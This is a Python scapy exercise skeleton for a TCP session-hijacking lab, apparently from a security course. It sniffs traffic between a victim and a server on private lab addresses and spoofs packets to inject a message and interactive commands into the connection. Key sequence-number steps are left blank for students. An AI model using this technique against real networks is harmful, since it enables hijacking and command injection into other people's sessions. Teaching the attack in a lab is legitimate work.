from scapy.all import *

VICTIM_IP='192.168.101.10'
SERVER_IP='192.168.101.30'

src = VICTIM_IP
dst = SERVER_IP
seq = 0
ack = 0
sport = 0
dport = 1234

hijacked = False

def stop_sniff(pkt):
    global hijacked
    return hijacked

def show_pkt(pkt):
    global seq, ack, sport, dport, hijacked

    # Ex1: Which packet should the script wait for? What
    # parameters can you use to filter out non useful packets?
    if pkt[TCP].flags != 'A':
        return

    if pkt[IP].src != SERVER_IP or pkt[IP].dst != VICTIM_IP:
        return

    if pkt[TCP].sport != 1234:
        return

    # Ex2: how can you get the necessary informations for
    # the attack (hint: check exercise 2 if you don't remember
    # the syntax
    seq = ...
    ack = ...
    sport = ...
    
    send_spoof_tcp(b"\n!!! Connection Hijacked !!!\n\r")
    hijacked=True

def send_spoof_tcp(command):
    global seq, ack, sport, dport, hijacked

    # Exercise 3.
    # Build the packet with the necessary informations 
    # and then send it!
    # hint: be careful of the tcp flags, which ones should you use?

    ip = IP(...)
    tcp = TCP(sport=..., dport=..., seq=..., ack=..., flags='PA')
    data = command
    pkt = sr1(..., verbose=False)
    seq = pkt[TCP].ack

    # Wait for the acknowledgment from the server
    if pkt[TCP].flags == "A":
        # Ex4: Should these fields be updated?
        ack = ...
        seq = ..

def command_inject():
    while True:
        try:
            cmd = input("inject> ").strip()
        except (EOFError, KeyboardInterrupt):
            print("\n[*] Exiting.")
            sys.exit(0)
        if not cmd:
            continue
        if cmd.lower() == "exit":
            print("[*] Exiting.")
            sys.exit(0)
        send_spoof_tcp(cmd + '\n')

if __name__ == "__main__":
    print("----------------------")
    sniff(filter="tcp",     # You can modify this filter as you please
      iface="eth0",
      prn=show_pkt,
      stop_filter=stop_sniff
      )
    command_inject()
